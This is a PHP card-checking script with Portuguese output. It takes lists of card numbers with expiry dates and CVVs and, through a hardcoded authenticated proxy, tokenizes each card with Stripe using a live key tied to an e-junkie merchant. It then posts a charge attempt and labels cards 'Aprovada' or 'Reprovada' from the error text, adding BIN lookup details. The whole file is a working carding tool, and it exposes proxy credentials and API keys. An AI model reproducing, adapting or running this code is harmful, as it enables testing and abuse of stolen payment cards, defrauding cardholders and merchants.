<?php
error_reporting(0);
$time = time();
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
echo '{"success":null,"message":"lista ou cartões não são válidos! tente novamente"}';
exit();
}

function getFluidpayDetails(string $bin): array {
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => array(
            'Authorization: pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type: application/json',
        ),
        CURLOPT_POSTFIELDS => json_encode([
            'type' => 'tokenizer',
            'type_id' => '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin' => $bin,
        ]),
    ));

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        curl_close($ch);
        return [
            'success' => false,
            'details' => 'Erro na requisição: ' . curl_error($ch),
        ];
    }

    curl_close($ch);

    $responseData = json_decode($response, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        return [
            'success' => false,
            'details' => 'Erro ao decodificar a resposta JSON.',
        ];
    }

    if (isset($responseData['status']) && $responseData['status'] === 'success') {
        $data = $responseData['data'];
        $details = implode(
            ' ',
            [
                $data['card_brand'] ?? '',
                $data['issuing_bank'] ?? '',
                $data['card_level_generic'] ?? '',
                strtoupper($data['country'] ?? ''),
                strtoupper($data['card_type'] ?? 'CREDIT'),
            ]
        );

        return [
            'success' => true,
            'details' => strtoupper(trim($details)),
        ];
    } else {
        return [
            'success' => false,
            'details' => strtoupper($responseData['msg'] ?? 'Erro desconhecido.'),
        ];
    }
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time();
    $random_num = mt_rand(1, 10000); 
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

$randomEmail = generate_email();

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

extract($_GET);
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$username = "4acazb8b794x2ez";
$password = "p7mskdc9v8fgby2";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.scrapegw.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.meuip.com.br/');
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.meuip.com.br',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
));
$u = curl_exec($ch);
$ip = GetStr($u, 'color: #FF8000;">Meu ip é ','<');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6',
    'content-type: application/x-www-form-urlencoded',
    'dnt: 1',
    'origin: https://js.stripe.com',
    'priority: u=1, i',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Opera";v="119"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/119.0.0.0',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&referrer=https%3A%2F%2Fwww.e-junkie.com&key=pk_live_UUFYTQ63roIxScFWo9jLfco5&_stripe_account=acct_1F9HkqLjvS2ZfM16&radar');
$code = curl_exec($ch);
$id = json_decode($code)->id;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.e-junkie.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6',
    'content-type: application/json',
    'dnt: 1',
    'origin: https://www.e-junkie.com',
    'priority: u=1, i',
    'referer: https://www.e-junkie.com/ecom/ccv3/?client_id=269844&cart_id=219927534&cart_md5=9bcce545fc7bea208bd39cf2804c665d&page_ln=en&jsod=&cb=1751854109&pref=%7B%22theme%22%3A%22theme1%22%2C%22language%22%3A%22english%22%2C%22layout%22%3A%22overlay%22%2C%22behaviour%22%3A%22normal%22%2C%22themeColor%22%3A%2294%2C%20195%2C%2098%22%7D&initialize',
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Opera";v="119"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/119.0.0.0',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_id":"'.$id.'","cart_id":"219927534","cart_md5":"9bcce545fc7bea208bd39cf2804c665d","first_name":"","last_name":"gustavo","email":"'.$randomEmail.'"}');
$pay = curl_exec($ch);
$msg = getStr($pay, 'error":"', '"');
$binchecker = getFluidpayDetails(substr($cc, 0, 6))['details'];

if (strpos($pay, "Your card's security code is incorrect")) {
    echo '<span class="text-success">Aprovada</span> ➔ <span class="text-white">' . $lista . ' ' . $binchecker . '</span> ➔ <span class="text-success"> ' . $msg . ' </span> ➔ PROXY: '.$ip.' ➔ <span class="text-warning"></span><br>';
} elseif (strpos($pay, "Your card has insufficient funds")) {
    echo '<span class="text-success">Aprovada</span> ➔ <span class="text-white">' . $lista . ' ' . $binchecker . '</span> ➔ <span class="text-success"> ' . $msg . ' </span> ➔ PROXY: '.$ip.' ➔ <span class="text-warning"></span><br>';
} else {
    echo '<span class="text-danger">Reprovada</span> ➔ <span class="text-white">' . $lista . ' ' . $binchecker . '</span> ➔ <span class="text-danger"> ' . $msg . ' </span> ➔ PROXY: '.$ip.' ➔ <span class="text-warning"></span><br>';
}
